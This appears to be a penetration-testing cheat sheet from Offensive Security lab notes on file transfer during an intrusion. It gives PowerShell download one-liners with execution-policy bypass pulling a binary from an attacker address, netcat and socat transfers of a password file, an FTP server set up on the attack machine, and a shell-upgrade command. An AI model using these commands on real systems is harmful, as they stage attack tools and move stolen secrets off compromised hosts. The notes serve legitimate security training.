### Using third-party file sharing links
https://www.file.io/

### Powershell
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')" 
powershell -nop -Exec Bypass -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
```

### SCP Copy file from remote machine to local tmp
scp john@localhost:/var/tmp/CopyMe.txt /tmp  
scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2  
scp -P 2222 student@192.168.79.112:/usr/share/kali-defaults/web/img/password.png /home/kali/

### NC transfering files
```
nc -lvnp 6666 > incoming.txt
nc -nv 192.168.65.61 6666 < incoming.txt
```

### Socat transfer files
```
sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt  
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
```

### Pure-ftpd (Linux - Linux)
#### install
sudo apt update && sudo apt install pure-ftpd  
sudo groupadd ftpgroup  
sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser  
sudo pure-pw useradd offsec -u kali -d /ftphome  
sudo pure-pw mkdb  
cd /etc/pure-ftpd/auth/  
sudo ln -s ../conf/PureDB 60pdb  
sudo mkdir -p /ftphome  
sudo chown -R ftpuser:ftpgroup /ftphome/  
sudo systemctl restart pure-ftpd  
#### connect
ftp 10.11.0.4  
bye  
#### Upgrading a Non-Interactive Shell
python -c 'import pty; pty.spawn("/bin/bash")'  
#### mode
bin(binary mode)
ascii(ascii mode)
#### transfer files
```
Authentication first
1. attack machine put files under ftphome dir
2. get filename/put filename
```
